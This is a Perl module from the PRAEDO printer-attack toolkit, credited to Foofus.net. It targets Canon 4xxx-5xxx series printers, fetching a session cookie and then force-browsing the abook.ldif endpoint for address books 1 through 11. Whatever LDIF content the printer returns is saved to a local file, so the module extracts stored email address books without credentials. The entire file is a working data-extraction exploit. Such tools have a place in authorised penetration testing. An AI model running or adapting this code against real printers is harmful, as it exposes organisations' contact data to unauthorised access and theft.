# Canon printer 4xxx-5xxx Series Module for extracting 
# email address books
######################################################
#                  PRAEDO Module #MP0010             #
#          Copyright (C) 2010 Foofus.net             #
#                                                    #
#               Deral "percX" Heiland                #
######################################################

package MP0010;
sub MP0010
{
 
# Set global variables
my $count = 1;
my $TARGET = $_[1];
my $PORTS = $_[2];
my $web = $_[3];
my $OUTPUT = $_[4];
my $LOGFILE = $_[5];


# Email Address Book Enumeration
open(OUTFILE, ">>./$OUTPUT/$LOGFILE.log") || die("Failed to open  Output file $OUTPUT \n");
print "\n**********Enumerated all Email Address books on Cannon printer $TARGET : JOB MP0010**********\n";
print OUTFILE "\n**********Enumerated all Email Address books on Cannon printer $TARGET : JOB MP0010**********\n";

my $browser = LWP::UserAgent->new(timeout => 15);

# Setup and retrieve cookie and place in cookie jar
my $jar = HTTP::Cookies->new();
$browser->cookie_jar($jar);
my $req= new HTTP::Request GET =>"http://$TARGET:$PORTS/";
my $res = $browser->request($req);
$jar->extract_cookies($res);

# retrieve E-mail Address Book page from cannon printer
for ($count=1; $count<12; $count++)
{
     print OUTFILE "\nAttempting to enumerate Email Address book #$count on Cannon printer $TARGET:JOB MP0010";
     print "\nAttempting to enumerate Email Address book #$count from Cannon printer $TARGET : JOB MP0010";
     my $response = $browser->get("http$web://$TARGET:$PORTS/abook.ldif?AID=$count&ACLS=2&ENC_FILE1=&ENC_FILE2=&ENC_MODE=0&ENC_FILE=",);
        if($response->content =~ m/failed/x)
            {
            print "\nAuthentication required - force browse failed";
            print OUTFILE "\nAuthentication required - force browse failed";
            }
        elsif($response->content =~ m/error/ix)
            {
            print "\nPrinter returned an error";
            print OUTFILE "\nPrinter returned an error";
            }
        elsif(($response->content =~ m/Don't open this page/ix) || ($response->content =~ m/Echec autorisation utilisateur/ix))
            {
            print "\n'DEBUG' User certification is invalid or date expired";
            print OUTFILE "\n'DEBUG' User certification is invalid or date expired";
            }
        else
            {
             open(JOBACCTOUTFILE, ">>./$OUTPUT/$TARGET-$PORTS-canon-address.ldif") || die("Failed to open  Output file $TARGET-$PORTS-canon-address.ldif \n");
             print JOBACCTOUTFILE $response->content;
            }


}
                   

# operation completed close out output files
close(OUTFILE);
close (JOBACCTOUTFILE);

}
		
1;
